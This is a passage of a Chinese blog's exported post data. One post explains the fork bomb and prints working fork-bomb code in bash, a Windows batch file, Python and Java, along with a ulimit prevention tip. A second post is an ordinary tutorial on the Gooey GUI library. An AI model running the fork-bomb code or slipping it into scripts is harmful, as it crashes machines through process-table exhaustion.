調用間脱鉤,以使最初的\":\"函数被關閉後為其所調用的兩個\":\"函數還能繼續執行 \n}　　# \":\"函數終止字元 \n;　　# \":\"函数定义结束后将要进行的操作... \n:　　# 调用\":\"函数,\"引爆\"fork炸弹\n\n\n\n#### Windows系统(创建一个.bat，写入以下命令运行即可)\n\n##### Code\n```bash\n%0|%0|%0\n```\n##### 注释\n%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat\n|%0就是打开自身后的程序再打开.bat\n3的指数倍\n\n##### 预防\n一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。\n\n\n#### 编程语言应用\n\nUsing Python:\n\n```bash\nimport os\nwhile 1:\n    os.fork()\n```\n\nUsing Java:\n\n```bash\npublic class ForkBomb\n{\n  public static void main(String[] args)\n  {\n    while(true)\n    {\n      Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});\n    }\n  }\n}\n```\n\n官方参考链接：[https://en.wikipedia.org/wiki/Fork_bomb](https://en.wikipedia.org/wiki/Fork_bomb)\n\n","slug":"Fork-Bomb","published":1,"updated":"2017-02-14T01:12:03.335Z","layout":"post","photos":[],"link":"","_id":"ciz80dy9z00003ofvjr288ce7","content":"<p>　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p>\n<h4 id=\"linux系统\"><a href=\"#linux系统\" class=\"headerlink\" title=\"linux系统\"></a>linux系统</h4><h5 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">:()&#123; :|:&amp; &#125;;:</div></pre></td></tr></table></figure>\n<h5 id=\"注解\"><a href=\"#注解\" class=\"headerlink\" title=\"注解\"></a>注解</h5><p>:()　# 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码<br>{　　# “:”函數起始字元<br>:　　# 用递归方式调用”:”函数本身<br>|　　# 並用管線(pipe)將其輸出引至…（因为有一个管線操作字元，因此會生成一個新的進程）<br>:　　# 另一次递归调用的”:”函数 # 综上,”:|:”表示的即是每次調用函数”:”的時候就會產生兩份拷貝<br>&amp;　　# 調用間脱鉤,以使最初的”:”函数被關閉後為其所調用的兩個”:”函數還能繼續執行<br>}　　# “:”函數終止字元<br>;　　# “:”函数定义结束后将要进行的操作…<br>:　　# 调用”:”函数,”引爆”fork炸弹</p>\n<h4 id=\"Windows系统-创建一个-bat，写入以下命令运行即可\"><a href=\"#Windows系统-创建一个-bat，写入以下命令运行即可\" class=\"headerlink\" title=\"Windows系统(创建一个.bat，写入以下命令运行即可)\"></a>Windows系统(创建一个.bat，写入以下命令运行即可)</h4><h5 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%0|%0|%0</div></pre></td></tr></table></figure>\n<h5 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h5><p>%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat<br>|%0就是打开自身后的程序再打开.bat<br>3的指数倍</p>\n<h5 id=\"预防\"><a href=\"#预防\" class=\"headerlink\" title=\"预防\"></a>预防</h5><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p>\n<h4 id=\"编程语言应用\"><a href=\"#编程语言应用\" class=\"headerlink\" title=\"编程语言应用\"></a>编程语言应用</h4><p>Using Python:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import os</div><div class=\"line\"><span class=\"keyword\">while</span> 1:</div><div class=\"line\">    os.fork()</div></pre></td></tr></table></figure>\n<p>Using Java:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">public class ForkBomb</div><div class=\"line\">&#123;</div><div class=\"line\">  public static void main(String[] args)</div><div class=\"line\">  &#123;</div><div class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">      Runtime.getRuntime().exec(new String[]&#123;<span class=\"string\">\"javaw\"</span>, <span class=\"string\">\"-cp\"</span>, System.getProperty(<span class=\"string\">\"java.class.path\"</span>), <span class=\"string\">\"ForkBomb\"</span>&#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>官方参考链接：<a href=\"https://en.wikipedia.org/wiki/Fork_bomb\" target=\"_blank\" rel=\"external\">https://en.wikipedia.org/wiki/Fork_bomb</a></p>\n","excerpt":"","more":"<p>　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p>\n<h4 id=\"linux系统\"><a href=\"#linux系统\" class=\"headerlink\" title=\"linux系统\"></a>linux系统</h4><h5 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">:()&#123; :|:&amp; &#125;;:</div></pre></td></tr></table></figure>\n<h5 id=\"注解\"><a href=\"#注解\" class=\"headerlink\" title=\"注解\"></a>注解</h5><p>:()　# 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码<br>{　　# “:”函數起始字元<br>:　　# 用递归方式调用”:”函数本身<br>|　　# 並用管線(pipe)將其輸出引至…（因为有一个管線操作字元，因此會生成一個新的進程）<br>:　　# 另一次递归调用的”:”函数 # 综上,”:|:”表示的即是每次調用函数”:”的時候就會產生兩份拷貝<br>&amp;　　# 調用間脱鉤,以使最初的”:”函数被關閉後為其所調用的兩個”:”函數還能繼續執行<br>}　　# “:”函數終止字元<br>;　　# “:”函数定义结束后将要进行的操作…<br>:　　# 调用”:”函数,”引爆”fork炸弹</p>\n<h4 id=\"Windows系统-创建一个-bat，写入以下命令运行即可\"><a href=\"#Windows系统-创建一个-bat，写入以下命令运行即可\" class=\"headerlink\" title=\"Windows系统(创建一个.bat，写入以下命令运行即可)\"></a>Windows系统(创建一个.bat，写入以下命令运行即可)</h4><h5 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%0|%0|%0</div></pre></td></tr></table></figure>\n<h5 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h5><p>%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat<br>|%0就是打开自身后的程序再打开.bat<br>3的指数倍</p>\n<h5 id=\"预防\"><a href=\"#预防\" class=\"headerlink\" title=\"预防\"></a>预防</h5><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p>\n<h4 id=\"编程语言应用\"><a href=\"#编程语言应用\" class=\"headerlink\" title=\"编程语言应用\"></a>编程语言应用</h4><p>Using Python:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import os</div><div class=\"line\"><span class=\"keyword\">while</span> 1:</div><div class=\"line\">    os.fork()</div></pre></td></tr></table></figure>\n<p>Using Java:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">public class ForkBomb</div><div class=\"line\">&#123;</div><div class=\"line\">  public static void main(String[] args)</div><div class=\"line\">  &#123;</div><div class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">      Runtime.getRuntime().exec(new String[]&#123;<span class=\"string\">\"javaw\"</span>, <span class=\"string\">\"-cp\"</span>, System.getProperty(<span class=\"string\">\"java.class.path\"</span>), <span class=\"string\">\"ForkBomb\"</span>&#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>官方参考链接：<a href=\"https://en.wikipedia.org/wiki/Fork_bomb\">https://en.wikipedia.org/wiki/Fork_bomb</a></p>\n"},{"title":"Gooey魔法","date":"2017-02-15T10:47:08.000Z","_content":"　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数---GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。\n\n### 安装Gooey\n最简单的安装方法：\n```bash\npip install Gooey\n```\n或者：\n```bash\ngit clone https://github.com/chriskiehl/Gooey.git\n```\n然后运行setup.py :\n```bash\npython setup.py install\n```\n相关依赖：\nwxpython\n安装：pip install wxpython (windows下需要去官网下载安装包)\n\n### 使用Gooey转化argparse\n最简单的例子，将argparse参数转化为GUI控件：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom gooey import Gooey\nimport argparse\n\n@Gooey()\ndef main():\n\tparser = argparse.ArgumentParser()\n\tparser.add_argument(\"test\",help=\"this is a test\" )\n\targs=parser.parse_args()\n\tprint args\n\nif __name__==\"__main__\":\n\tmain()\n```\n运行截图：\n![](/upload_image/20170215/1.png)\n\n说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。\n\n参数：\n```bash\n@Gooey(advanced=Boolean,          # toggle whether to show advanced config or not \n       language=language_string,  # Translations configurable via json\n       show_config=True,          # skip config screens all together\n       program_name='name',       # Defaults to script name\n       program_description,       # Defaults to ArgParse Description\n       default_size=(610, 530),   # starting size of the GUI\n       required_cols=1,           # number of columns in the \"Required\" section\n       optional_cols=2,           # number of columbs in the \"Optional\" section\n       dump_build_config=False,   # Dump the JSON Gooey uses to configure itself\n       load_build_config=None,    # Loads a JSON Gooey-generated configuration\n       monospace_display=False)   # Uses a mono-spaced font in the output screen\n       image_dir                  # Path to the diretory in which Gooey should look for custom inmages\n       language_dir               # Path to the diretory in which Gooey should look for custom languages\n)\n```\n参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)\n```bash\n@Gooey(program_name=u'这是一个测试脚本',default_size=(500,500))\ndef main():\n\tparser = argparse.ArgumentParser(description=u\"测试描述内容\")\n\tparser.add_argument(\"test\",help=\"this is a test\" )\n\targs=parser.parse_args()\n\tprint args\n\nif __name__==\"__main__\":\n\tmain()\n```\n运行截图：\n![](/upload_image/20170215/2.png)\n\n### 使用GooeyParse\n简单例子：\n```bash\nfrom gooey import Gooey, GooeyParser\n\n@Gooey(program_name=\"test\",image_dir=\".\\image\") ##注意斜杠\ndef main():\n    parser=GooeyParser(description=u\"测试\")\n    ##文本输入框\n    parser.add_argument(\"test\",help=\"this is a test\")\n    ##选择框\n    parser.add_argument(\n     \"test2\",\n     metavar='Should I exlode?',   ##描述内容\n     help=\"this is test2\",         ##帮助内容\n     choices=[\"Yes\",\"No\"],         ##选择框\n     default=\"Yes\"                 ##默认值\n     )\n    ##复选框\n    parser.add_argument(\n       '-f','--foo',\n       metavar=\"some flag\",\n       action=\"store_true\",        ##参数类型\n       help=\"\")\n    ##文本选择按钮\n    parser.add_argument('filename', metavar=u\"文件选择\",help=\"name of the file to process\", widget='FileChooser') #文本选择按钮\n    parser.add_argument('datetime', metavar=u\"时间选择\",help=\"date to process\",widget='DateChooser',default=\"2017-02-15\") #时间选择按钮\n    args=parser.parse_args()\n    print args\n\nif __name__==\"__main__\":\n     main()\n```\n运行截图：\n![](/upload_image/20170215/3.png)\n说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中'test'对应前者，'-test'对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。\n\nimage目录下图片文件名，分别用来覆盖界面上的图片：\n* program_icon.ico  　　ico图标\n* success_icon.png  　　运行成功的图标\n* running_icon.png  　　正在运行时的图标\n* loading_icon.gif  　　加载时的图标\n* config_icon.png   　　配置图片\n* error_icon.png    　　出错时的图片\n\naction内容表示参数类型，分别对应着wxpython相应的控件：\n\n* store 　　TextCtrl\n* store_const 　　CheckBox\n* store_true  　　CheckBox\n* store_False 　　CheckBox\n* append      　　TextCtrl\n* count       　　DropDown\n* Mutually Exclusive Group  　　RadioGroup\n* chooice     　　DropDown\n\n除了action之外，Gooey还提供了一些小工具（Widgets）\n* DirChooser   　　目录选择按钮工具\n* FileChooser  　　文件选择按钮工具\n* DateChooser  　　时间选择按钮工具\n\n### 优缺点\n　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。\n\n\n参考文档：\nGitHub地址:[https://github.com/chriskiehl/Gooey](https://github.com/chriskiehl/Gooey)\n官方例子：[https://github.com/chriskiehl/GooeyExamples/tree/master/examples](https://github.com/chriskiehl/GooeyExamples/tree/master/examples)\n官方文档：[https://github.com/chriskiehl/Gooey#how-does-it-work](https://github.com/chriskiehl/Gooey#how-does-it-work)\n\n\n\n\n\n\n\n\n","source":"_posts/Gooey魔法.md","raw":"---\ntitle: Gooey魔法\ndate: 2017-02-15 18:47:08\ntags: Gooey\ncategories: 编程之道\n---\n　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数---GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。\n\n### 安装Gooey\n最简单的安装方法：\n```bash\npip install Gooey\n```\n或者：\n```bash\ngit clone https://github.com/chriskiehl/Gooey.git\n```\n然后运行setup.py :\n```bash\npython setup.py install\n```\n相关依赖：\nwxpython\n安装：pip install wxpython (windows下需要去官网下载安装包)\n\n### 使用Gooey转化argparse\n最简单的例子，将argparse参数转化为GUI控件：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom gooey import Gooey\nimport argparse\n\n@Gooey()\ndef main():\n\tparser = argparse.ArgumentParser()\n\tparser.add_argument(\"test\",help=\"this is a test\" )\n\targs=parser.parse_args()\n\tprint args\n\nif __name__==\"__main__\":\n\tmain()\n```\n运行截图：\n![](/upload_image/20170215/1.png)\n\n说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。\n\n参数：\n```bash\n@Gooey(advanced=Boolean,          # toggle whether to show advanced config or not \n       language=language_string,  # Translations configurable via json\n       show_config=True,          # skip config screens all together\n       program_name='name',       # Defaults to script name\n       program_description,       # Defaults to ArgParse Description\n       default_size=(610, 530),   # starting size of the GUI\n       required_cols=1,           # number of columns in the \"Required\" section\n       optional_cols=2,           # number of columbs in the \"Optional\" section\n       dump_build_config=False,   # Dump the JSON Gooey uses to configure itself\n       load_build_config=None,    # Loads a JSON Gooey-generated configuration\n       monospace_display=False)   # Uses a mono-spaced font in the output screen\n       image_dir                  # Path to the diretory in which Gooey should look for custom inmages\n       language_dir               # Path to the diretory in which Gooey should look for custom languages\n)\n```\n参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)\n```bash\n@Gooey(program_name=u'这是一个测试脚本',default_size=(500,500))\ndef main():\n\tparser = argparse.ArgumentParser(description=u\"测试描述内容\")\n\tparser.add_argument(\"test\",help=\"this is a test\" )\n\targs=parser.parse_args()\n\tprint args\n\nif __name__==\"__main__\":\n\tmain()\n```\n运行截图：\n![](/upload_image/20170215/2.png)\n\n### 使用GooeyParse\n简单例子：\n```bash\nfrom gooey import Gooey, GooeyParser\n\n@Gooey(program_name=\"test\",image_dir=\".\\image\") ##注意斜杠\ndef main():\n    parser=GooeyParser(description=u\"测试\")\n    ##文本输入框\n    parser.add_argument(\"test\",help=\"this is a test\")\n    ##选择框\n    parser.add_argument(\n     \"test2\",\n     metavar='Should I exlode?',   ##描述内容\n     help=\"this is test2\",         ##帮助内容\n     choices=[\"Yes\",\"No\"],         ##选择框\n     default=\"Yes\"                 ##默认值\n     )\n    ##复选框\n    parser.add_argument(\n       '-f','--foo',\n       metavar=\"some flag\",\n       action=\"store_true\",        ##参数类型\n       help=\"\")\n    ##文本选择按钮\n    parser.add_argument('filename', metavar=u\"文件选择\",help=\"name of the file to process\", widget='FileChooser') #文本选择按钮\n    parser.add_argument('datetime', metavar=u\"时间选择\",help=\"date to process\",widget='DateChooser',default=\"2017-02-15\") #时间选择按钮\n    args=parser.parse_args()\n    print args\n\nif __name__==\"__main__\":\n     main()\n```\n运行截图：\n![](/upload_image/20170215/3.png)\n说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中'test'对应前者，'-test'对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。\n\nimage目录下图片文件名，分别用来覆盖界面上的图片：\n* program_icon.ico  　　ico图标\n* success_icon.png  　　运行成功的图标\n* running_icon.png  　　正在运行时的图标\n* loading_icon.gif  　　加载时的图标\n* config_icon.png   　　配置图片\n* error_icon.png    　　出错时的图片\n\naction内容表示参数类型，分别对应着wxpython相应的控件：\n\n* store 　　TextCtrl\n* store_const 　　CheckBox\n* store_true  　　CheckBox\n* store_False 　　CheckBox\n* append      　　TextCtrl\n* count       　　DropDown\n* Mutually Exclusive Group  　　RadioGroup\n* chooice     　　DropDown\n\n除了action之外，Gooey还提供了一些小工具（Widgets）\n* DirChooser   　　目录选择按钮工具\n* FileChooser  　　文件选择按钮工具\n* DateChooser  　　时间选择按钮工具\n\n### 优缺点\n　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。\n\n\n参考文档：\nGitHub地址:[https://github.com/chriskiehl/Gooey](https://github.com/chriskiehl/Gooey)\n官方例子：[https://github.com/chriskiehl/GooeyExamples/tree/master/examples](https://github.com/chriskiehl/GooeyExamples/tree/master/examples)\n官方文档：[https://github.com/chriskiehl/Gooey#how-does-it-work](https://github.com/chriskiehl/Gooey#how-does-it-work)\n\n\n\n\n\n\n\n\n","slug":"Gooey魔法","published":1,"updated":"2017-02-16T04:53:33.007Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciz80dya900023ofvgiqx8ztw","content":"<p>　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数—GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。</p>\n<h3 id=\"安装Gooey\"><a href=\"#安装Gooey\" class=\"headerlink\" title=\"安装Gooey\"></a>安装Gooey</h3><p>最简单的安装方法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install Gooey</div></pre></td></tr></table></figure></p>\n<p>或者：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/chriskiehl/Gooey.git</div></pre></td></tr></table></figure></p>\n<p>然后运行setup.py :<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python setup.py install</div></pre></td></tr></table></figure></p>\n<p>相关依赖：<br>wxpython<br>安装：pip install wxpython (windows下需要去官网下载安装包)</p>\n<h3 id=\"使用Gooey转化argparse\"><a href=\"#使用Gooey转化argparse\" class=\"headerlink\" title=\"使用Gooey转化argparse\"></a>使用Gooey转化argparse</h3><p>最简单的例子，将argparse参数转化为GUI控件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\">from gooey import Gooey</div><div class=\"line\">import argparse</div><div class=\"line\"></div><div class=\"line\">@Gooey()</div><div class=\"line\">def main():</div><div class=\"line\">\tparser = argparse.ArgumentParser()</div><div class=\"line\">\tparser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span> )</div><div class=\"line\">\targs=parser.parse_args()</div><div class=\"line\">\t<span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tmain()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/1.png\" alt=\"\"></p>\n<p>说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。</p>\n<p>参数：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">@Gooey(advanced=Boolean,          <span class=\"comment\"># toggle whether to show advanced config or not </span></div><div class=\"line\">       language=language_string,  <span class=\"comment\"># Translations configurable via json</span></div><div class=\"line\">       show_config=True,          <span class=\"comment\"># skip config screens all together</span></div><div class=\"line\">       program_name=<span class=\"string\">'name'</span>,       <span class=\"comment\"># Defaults to script name</span></div><div class=\"line\">       program_description,       <span class=\"comment\"># Defaults to ArgParse Description</span></div><div class=\"line\">       default_size=(610, 530),   <span class=\"comment\"># starting size of the GUI</span></div><div class=\"line\">       required_cols=1,           <span class=\"comment\"># number of columns in the \"Required\" section</span></div><div class=\"line\">       optional_cols=2,           <span class=\"comment\"># number of columbs in the \"Optional\" section</span></div><div class=\"line\">       dump_build_config=False,   <span class=\"comment\"># Dump the JSON Gooey uses to configure itself</span></div><div class=\"line\">       load_build_config=None,    <span class=\"comment\"># Loads a JSON Gooey-generated configuration</span></div><div class=\"line\">       monospace_display=False)   <span class=\"comment\"># Uses a mono-spaced font in the output screen</span></div><div class=\"line\">       image_dir                  <span class=\"comment\"># Path to the diretory in which Gooey should look for custom inmages</span></div><div class=\"line\">       language_dir               <span class=\"comment\"># Path to the diretory in which Gooey should look for custom languages</span></div><div class=\"line\">)</div></pre></td></tr></table></figure></p>\n<p>参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">@Gooey(program_name=u<span class=\"string\">'这是一个测试脚本'</span>,default_size=(500,500))</div><div class=\"line\">def main():</div><div class=\"line\">\tparser = argparse.ArgumentParser(description=u<span class=\"string\">\"测试描述内容\"</span>)</div><div class=\"line\">\tparser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span> )</div><div class=\"line\">\targs=parser.parse_args()</div><div class=\"line\">\t<span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tmain()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/2.png\" alt=\"\"></p>\n<h3 id=\"使用GooeyParse\"><a href=\"#使用GooeyParse\" class=\"headerlink\" title=\"使用GooeyParse\"></a>使用GooeyParse</h3><p>简单例子：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">from gooey import Gooey, GooeyParser</div><div class=\"line\"></div><div class=\"line\">@Gooey(program_name=<span class=\"string\">\"test\"</span>,image_dir=<span class=\"string\">\".\\image\"</span>) <span class=\"comment\">##注意斜杠</span></div><div class=\"line\">def main():</div><div class=\"line\">    parser=GooeyParser(description=u<span class=\"string\">\"测试\"</span>)</div><div class=\"line\">    <span class=\"comment\">##文本输入框</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span>)</div><div class=\"line\">    <span class=\"comment\">##选择框</span></div><div class=\"line\">    parser.add_argument(</div><div class=\"line\">     <span class=\"string\">\"test2\"</span>,</div><div class=\"line\">     metavar=<span class=\"string\">'Should I exlode?'</span>,   <span class=\"comment\">##描述内容</span></div><div class=\"line\">     <span class=\"built_in\">help</span>=<span class=\"string\">\"this is test2\"</span>,         <span class=\"comment\">##帮助内容</span></div><div class=\"line\">     choices=[<span class=\"string\">\"Yes\"</span>,<span class=\"string\">\"No\"</span>],         <span class=\"comment\">##选择框</span></div><div class=\"line\">     default=<span class=\"string\">\"Yes\"</span>                 <span class=\"comment\">##默认值</span></div><div class=\"line\">     )</div><div class=\"line\">    <span class=\"comment\">##复选框</span></div><div class=\"line\">    parser.add_argument(</div><div class=\"line\">       <span class=\"string\">'-f'</span>,<span class=\"string\">'--foo'</span>,</div><div class=\"line\">       metavar=<span class=\"string\">\"some flag\"</span>,</div><div class=\"line\">       action=<span class=\"string\">\"store_true\"</span>,        <span class=\"comment\">##参数类型</span></div><div class=\"line\">       <span class=\"built_in\">help</span>=<span class=\"string\">\"\"</span>)</div><div class=\"line\">    <span class=\"comment\">##文本选择按钮</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">'filename'</span>, metavar=u<span class=\"string\">\"文件选择\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"name of the file to process\"</span>, widget=<span class=\"string\">'FileChooser'</span>) <span class=\"comment\">#文本选择按钮</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">'datetime'</span>, metavar=u<span class=\"string\">\"时间选择\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"date to process\"</span>,widget=<span class=\"string\">'DateChooser'</span>,default=<span class=\"string\">\"2017-02-15\"</span>) <span class=\"comment\">#时间选择按钮</span></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\">    <span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">     main()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/3.png\" alt=\"\"><br>说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional 